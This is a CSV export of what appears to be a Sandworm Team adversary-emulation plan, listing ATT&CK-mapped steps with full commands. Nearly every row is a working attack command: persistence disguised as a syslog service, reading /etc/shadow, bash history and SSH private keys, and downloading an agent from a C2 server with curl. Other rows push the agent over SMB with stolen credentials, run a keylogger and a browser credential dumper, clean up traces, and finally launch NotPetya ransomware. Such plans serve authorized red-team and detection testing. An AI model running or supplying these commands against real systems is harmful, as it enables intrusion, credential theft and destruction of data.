source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
sandworm,sandworm,Sandworm Team (G0034),14,11,f6d72009-d093-461a-986c-e1ab9b04db51,14.A.1,persistence,T1053.003,Scheduled Task/Job: Cron,Sandworm Establish Crontab Persistence,Sandworm establishes crontab persistence.,"dir=$(dirname #{location}); croncontents=$(crontab -l 2>/dev/null); printf ""$croncontents\n1 * * * * cd $dir && #{exe_name}\n@reboot cd $dir && #{exe_name}\n"" | crontab -","dir=$(dirname #{location});
croncontents=$(crontab -l 2>/dev/null);
printf ""$croncontents\n1 * * * * cd $dir && #{exe_name}\n@reboot cd $dir && #{exe_name}\n"" | crontab -"
sandworm,sandworm,Sandworm Team (G0034),14,12,82d61362-0f60-45d9-a3e1-26ec20cb3387,14.A.2,persistence,T1543.002,Create or Modify System Process: Systemd Service,Sandworm Establish Systemd Persistence,Sandworm establishes systemd persistence.,"printf ""[Unit]\nDescription=Syslog daemon\n\n[Service]\nWorkingDirectory=$(dirname #{location})\nExecStartPre=/bin/rm -f /tmp/.applocktx\nExecStart=#{location}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target""...","printf ""[Unit]\nDescription=Syslog daemon\n\n[Service]\nWorkingDirectory=$(dirname #{location})\nExecStartPre=/bin/rm -f /tmp/.applocktx\nExecStart=#{location}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target"" > /etc/systemd/system/syslogd.service;
chmod 0644 /etc/systemd/system/syslogd.service;
systemctl enable syslogd.service;
systemctl daemon-reload;"
sandworm,sandworm,Sandworm Team (G0034),14,13,8e965415-40be-40f8-8786-da4f67748fef,14.A.3,credential-access,T1003.008,OS Credential Dumping: /etc/passwd and /etc/shadow,Sandworm Read /etc/shadow,Sandworm reads /etc/shadow. Note: not in CTI but in TTP scope.,cat /etc/shadow,cat /etc/shadow
sandworm,sandworm,Sandworm Team (G0034),14,14,40934e60-6b0d-4d3b-a8f5-ad111c6a0abc,14.A.4,credential-access,T1552.003,Unsecured Credentials: Bash History,Sandworm Get Bash History,Sandworm reads bash history. Note: not in CTI but in TTP scope.,cat /home/#{initial.user.name}/.bash_history,cat /home/#{initial.user.name}/.bash_history
sandworm,sandworm,Sandworm Team (G0034),14,15,dc3152ac-1014-4f96-98c9-a64d5a61712e,14.A.5,credential-access,T1552.004,Unsecured Credentials: Private Keys,Sandworm Get SSH Keys,Sandworm reads SSH keys. Note: not in CTI but in TTP scope.,cat /home/#{initial.user.name}/.ssh/id_rsa; cat /home/#{initial.user.name}/.ssh/id_rsa.pub;,"cat /home/#{initial.user.name}/.ssh/id_rsa;
cat /home/#{initial.user.name}/.ssh/id_rsa.pub;"
sandworm,sandworm,Sandworm Team (G0034),15,16,ee1e23ad-87d4-4d69-932f-2e5631508c8e,15.A.1-3,lateral-movement,T1021.002,Remote Services: SMB/Windows Admin Shares,Sandworm Upload Agent to Windows Host,"Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. Sandworm Team has used previously acquired legitimate credentials prior to attacks. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).","server=""#{server}""; curl -s -X POST -H ""file:sandcat.go"" -H ""platform:windows"" -H ""server:$server"" -H ""group:gammu"" $server/file/download > wsmprovav.exe; chmod +x wsmprovav.exe; smbclient -U 'WORKGROUP\#{second_host....","server=""#{server}"";
curl -s -X POST -H ""file:sandcat.go"" -H ""platform:windows"" -H ""server:$server"" -H ""group:gammu"" $server/file/download > wsmprovav.exe;
chmod +x wsmprovav.exe;
smbclient -U 'WORKGROUP\#{second_host.user.name}' //#{second.target.host}/ADMIN$ -c ""put ./wsmprovav.exe wsmprovav.exe;"" ""#{second_host.user.password}"""
sandworm,sandworm,Sandworm Team (G0034),15,17,57771abd-0789-4dda-bb02-31359e6860db,15.A.4-7,execution,T1569.002,System Services: Service Execution,Sandworm Service Creation/Execution and Registry Persistence,"Uses psexec.py to gain a bind-shell to target over SMB (TCP 445). Loads the registry hive for target user. Set registry persistence for target user only, which will execute the previously uploaded agent executable. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).","./psexec_sandworm.py -service-name ""Windows Check AV"" WORKGROUP/#{second_host.user.name}:#{second_host.user.password}@#{second.target.host} cmd /c 'reg.exe LOAD HKU\Temp ""C:\Users\#{second_host.user.name}\NTUSER.DAT"" ...","./psexec_sandworm.py -service-name ""Windows Check AV"" WORKGROUP/#{second_host.user.name}:#{second_host.user.password}@#{second.target.host} cmd /c 'reg.exe LOAD HKU\Temp ""C:\Users\#{second_host.user.name}\NTUSER.DAT"" & reg.exe ADD HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d ""C:\Windows\wsmprovav.exe""' 2>&1"
sandworm,sandworm,Sandworm Team (G0034),15,18,c4c08a1f-15d6-4dfd-9ba7-9b61594762ff,15.A.7-10,persistence,T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Sandworm RDP to Execute Agent Implant,RDP into target host to trigger the registry persistence which will execute the uploaded agent implant. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).,"exec-background xfreerdp +clipboard /u:WORKGROUP\\#{second_host.user.name} /p:""#{second_host.user.password}"" /v:#{second.target.host} /cert-ignore","exec-background xfreerdp +clipboard /u:WORKGROUP\\#{second_host.user.name} /p:""#{second_host.user.password}"" /v:#{second.target.host} /cert-ignore"
sandworm,sandworm,Sandworm Team (G0034),15,19,236fd943-2bd8-400a-9a63-33f724629ca4,15.A.7-10,persistence,T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Sandworm Wait For Lat Move Target Beacon,Wait for the registry persistence to trigger and for the new agent beacon to come in. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).,sleep 40,sleep 40
sandworm,sandworm,Sandworm Team (G0034),16,20,e870a202-354f-4214-82e6-c5f88cb33b65,16.A.1,discovery,T1033,System Owner/User Discovery,Sandworm Windows Discovery - Current User,Sandworm Team has collected the username from a compromised host.,whoami.exe,whoami.exe
sandworm,sandworm,Sandworm Team (G0034),16,21,90cbd004-d5e9-4b05-9abe-12b93f77ede3,16.A.2,discovery,T1082,System Information Discovery,Sandworm Windows Discovery - Windows Version Info,Sandworm Team enumerates information about the infected system's operating system.,"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v ProductName & reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentMajorVersionNumber & reg query ""HKLM\SOFTWARE\Microsoft\Windows NT...","reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v ProductName &
reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentMajorVersionNumber &
reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentMinorVersionNumber &
reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentBuild"
sandworm,sandworm,Sandworm Team (G0034),16,22,fa3ea4c1-c980-41b1-be78-c8c932d68e98,16.A.3,discovery,T1083,File and Directory Discovery,Sandworm Windows Discovery - List Entire File System,Sandworm Team has enumerated files on a compromised host.,dir /s /b C:\ > dir.out,dir /s /b C:\ > dir.out
sandworm,sandworm,Sandworm Team (G0034),16,23,73decaa1-5ba3-4739-812d-633929a158fd,16.A.4-5,discovery,T1049,System Network Connections Discovery,Sandworm Windows Discovery - List RDP Connections,"Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host.",netstat -ano | findstr 3389,netstat -ano | findstr 3389
sandworm,sandworm,Sandworm Team (G0034),17,24,9a438a2a-c95b-4fd2-a29f-8b1250fc3adc,17.A.1,command-and-control,T1105,Ingress Tool Transfer,Sandworm Download Web Credential Dumper,"Sandworm downloads web credential dumper oradump.exe to disk. oradump.exe is a variant of the open source tool, LaZagne. It has been refactored, some functionality removed, and compiled into a portable executable via PyInstaller.",move .\dumpWebBrowserCreds.exe C:\Windows\System32\oradump.exe,move .\dumpWebBrowserCreds.exe C:\Windows\System32\oradump.exe
sandworm,sandworm,Sandworm Team (G0034),17,25,1da1b17e-66fd-4f39-bf10-203570a62624,17.A.2,credential-access,T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Sandworm Execute Web Credential Dumper,Sandworm executes web credential dumper oradump.exe.,C:\Windows\System32\oradump.exe 2>&1,C:\Windows\System32\oradump.exe 2>&1
sandworm,sandworm,Sandworm Team (G0034),17,26,ccbb3c07-dc04-46f5-83d3-54fe71deab3c,17.A.3,command-and-control,T1105,Ingress Tool Transfer,Sandworm Download Keylogger,Sandworm downloads keylogger to disk.,move .\keylogger.exe C:\Windows\System32\mslog.exe,move .\keylogger.exe C:\Windows\System32\mslog.exe
sandworm,sandworm,Sandworm Team (G0034),17,27,1d317399-d786-4c58-889f-01cf496ba5d2,17.A.4,credential-access,T1056.001,Input Capture: Keylogging,Sandworm Log Keystrokes,Sandworm runs the keylogger in the background to log keystrokes to mslog.txt. Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.,"exec-background cmd.exe /k ""C:\Windows\System32\mslog.exe -o C:\Windows\System32\mslog.txt""","exec-background cmd.exe /k ""C:\Windows\System32\mslog.exe -o C:\Windows\System32\mslog.txt"""
sandworm,sandworm,Sandworm Team (G0034),17,28,e895decc-93fa-42bb-8609-3a62d14fcb60,17.A.4,credential-access,T1056.001,Input Capture: Keylogging,Sandworm Let Keystroke Logger Run,Wait 30 seconds to allow the operator to perform keystrokes for logging. Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.,sleep 30,sleep 30
sandworm,sandworm,Sandworm Team (G0034),17,29,5c034afc-1f10-4e92-8d77-afed302d7de5,17.A.4,credential-access,T1056.001,Input Capture: Keylogging,Sandworm Verify Keystroke File,Verifies that the mslog.txt file was created.,dir C:\Windows\System32\mslog.txt,dir C:\Windows\System32\mslog.txt
sandworm,sandworm,Sandworm Team (G0034),17,30,854c63de-cc94-4581-81b0-4c2292123898,17.A.6,exfiltration,T1041,Exfiltration Over C2 Channel,Sandworm Upload Keystroke File,Reads contents of the mslog.txt keystroke file and uploads the file to the C2 server.,type C:\Windows\System32\mslog.txt,type C:\Windows\System32\mslog.txt
sandworm,sandworm,Sandworm Team (G0034),17,31,65639630-733c-4179-8543-2c64cb577ca0,17.A.6,credential-access,T1056.001,Input Capture: Keylogging,Sandworm Stop Keystroke Logger,Terminates the mslog.exe keystroke process.,taskkill /F /IM mslog.exe,taskkill /F /IM mslog.exe
sandworm,sandworm,Sandworm Team (G0034),17,32,6222bcab-b7ec-4523-a236-273d48270649,17.A.7,discovery,T1018,Remote System Discovery,Sandworm Remote System Discovery (dsquery),Sandworm Enumerate all domain hosts via dsquery.exe in preparation for notpetya deployment.,dsquery.exe computer -s #{dc.target.host} -u #{domain.admin.name} -p #{domain.admin.password},dsquery.exe computer -s #{dc.target.host} -u #{domain.admin.name} -p #{domain.admin.password}
sandworm,sandworm,Sandworm Team (G0034),17,33,d91962e6-cb75-4f29-b2ce-36db15415e40,17.A.8,defense-evasion,T1070.004,Indicator Removal on Host: File Deletion,Sandworm Cleanup Artifacts,Sandworm Team has used backdoors that can delete files used in an attack from an infected system.,del /Q C:\Windows\System32\oradump.exe C:\Windows\System32\mslog.exe C:\Windows\System32\mslog.txt,del /Q C:\Windows\System32\oradump.exe C:\Windows\System32\mslog.exe C:\Windows\System32\mslog.txt
sandworm,sandworm,Sandworm Team (G0034),17,34,2093de68-db55-4c75-82d1-3abd5fc58028,17.A.8,lateral-movement,T1021.001,Remote Services: Remote Desktop Protocol,Terminate RDP Session to Second Target (Gammu),"End the RDP session to the second target. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since the RDP connection originates from the attacker's machine.",pkill xfreerdp,pkill xfreerdp
sandworm,sandworm,Sandworm Team (G0034),18,35,690e889f-5844-473e-98c5-c90c9f1772dc,18.A.1,command-and-control,T1105,Ingress Tool Transfer,Prepare Tools for Ingress Tool Transfer (Arrakis),,"mkdir -p sw_tools; server=""#{server}""; curl -s -X POST -H ""file:sandcat.go"" -H ""platform:windows"" -H ""server:$server"" -H ""group:arrakis"" $server/file/download > perfc.exe; chmod +x perfc.exe; cp SharpNP.dll ./sw_tools...","mkdir -p sw_tools;
server=""#{server}"";
curl -s -X POST -H ""file:sandcat.go"" -H ""platform:windows"" -H ""server:$server"" -H ""group:arrakis"" $server/file/download > perfc.exe;
chmod +x perfc.exe;
cp SharpNP.dll ./sw_tools/;
mv perfc.exe ./sw_tools/;"
sandworm,sandworm,Sandworm Team (G0034),18,36,2f107b88-065f-4d91-9d46-212212b235d5,18.A.1-2,lateral-movement,T1021.001,Remote Services: Remote Desktop Protocol,Lateral Movement Via RDP (Arrakis),"This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since the RDP connection must originate from the attacker's machine.","exec-background xfreerdp +clipboard /u:WORKGROUP\\#{domain.admin.name} /p:""#{domain.admin.password}"" /v:#{dc.target.host} /drive:X,./sw_tools /cert-ignore","exec-background xfreerdp +clipboard /u:WORKGROUP\\#{domain.admin.name} /p:""#{domain.admin.password}"" /v:#{dc.target.host} /drive:X,./sw_tools /cert-ignore"
sandworm,sandworm,Sandworm Team (G0034),18,37,58cf78ef-e777-4de8-aeaa-8cc8349be6f7,18.A.3,command-and-control,T1105,Ingress Tool Transfer,Download and Execute Agent for Lateral Movement (Arrakis),"Downloads a new agent executable and executes it on the domain controller over RDP. This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself), since the RDP connection will be from the attacker's machine. Requires xdotool to be installed on the running machine.","sleep 30; rdp_pid=$(pgrep -f ""xfreerdp.*/v:#{dc.target.host}""); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool windowactivate --sync ""$rdp_window"" key Super_L; sleep 5; xdotool windowactivate --sync ""$rdp_wind...","sleep 30;
rdp_pid=$(pgrep -f ""xfreerdp.*/v:#{dc.target.host}"");
rdp_window=$(xdotool search --pid ""$rdp_pid"");
xdotool windowactivate --sync ""$rdp_window"" key Super_L;
sleep 5; xdotool windowactivate --sync ""$rdp_window"" type --delay 200 ""powershell.exe"";
sleep 5; xdotool windowactivate --sync ""$rdp_window"" key --clearmodifiers --delay 200 Control_L+Shift_L+Return;
sleep 10; xdotool windowactivate --sync ""$rdp_window"" key Left;
sleep 3; xdotool windowactivate --sync ""$rdp_window"" key Return;
sleep 15; xdotool windowactivate --sync ""$rdp_window"" type --delay 200 'copy \\TSCLIENT\X\perfc.exe .\perfc.exe';
sleep 3; xdotool windowactivate --sync ""$rdp_window"" key Return;
sleep 3; xdotool windowactivate --sync ""$rdp_window"" type --delay 200 '.\perfc.exe';
sleep 3; xdotool windowactivate --sync ""$rdp_window"" key Return;
sleep 30;"
sandworm,sandworm,Sandworm Team (G0034),18,38,ba30987a-efc8-46a6-b0ec-94f4cc53dbff,18.A.3-4,command-and-control,T1105,Ingress Tool Transfer,Sandworm Download NotPetya,Sandworm downloads NotPetya (perfc.dat) using powershell.,copy \\TSCLIENT\X\SharpNP.dll C:\Windows\perfc.dat; dir C:\Windows\perfc.dat;,"copy \\TSCLIENT\X\SharpNP.dll C:\Windows\perfc.dat;
dir C:\Windows\perfc.dat;"
sandworm,sandworm,Sandworm Team (G0034),19,39,9a39f75e-215d-4ef5-b505-ce81be74d58f,19.A,impact,T1486,Data Encrypted for Impact,Sandworm Executes NotPetya (perfc.dat),"Sandworm executes NotPetya (perfc.dat). NotPetya creates a scheduled task called ""Restart"" that reboots the workstation and is executed at the end of the program. NotPetya encrypts files under C:\Users (recursive) via AES-128. NotPetya drops a ransom note in C:\README.txt. NotPetya copies and executes itself on other hosts.","rundll32.exe C:\Windows\perfc.dat,""#1""","rundll32.exe C:\Windows\perfc.dat,""#1"""
sandworm,sandworm,Sandworm Team (G0034),19,40,a86485c0-772d-4159-aa6f-5c2a9bb13ac8,19.A,lateral-movement,T1021.001,Remote Services: Remote Desktop Protocol,Terminate RDP Session to Domain Controller (Arrakis),"End the RDP session to the domain controller. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since the RDP connection originates from the attacker's machine.",pkill xfreerdp,pkill xfreerdp
